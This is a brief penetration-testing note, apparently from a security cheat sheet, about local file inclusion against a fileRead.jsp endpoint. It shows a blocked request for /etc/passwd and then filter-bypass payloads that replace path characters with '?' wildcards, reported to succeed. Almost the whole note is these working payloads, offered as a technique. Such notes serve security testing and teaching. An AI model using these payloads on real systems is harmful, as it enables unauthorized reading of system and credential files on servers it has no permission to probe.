# File Inclusion

## LFI workaround PoC

LFI via this path does not work at first&#x20;

&#x20;`/fileRead.jsp?fileName=/etc/passwd (406)`&#x20;

But after replacing character with ? you may receive a successful response (200)

`/fileRead.jsp?fileName=/?tc/?asswd (200)`

`fileRead.jsp?fileName=/??c/??sswd (200)`
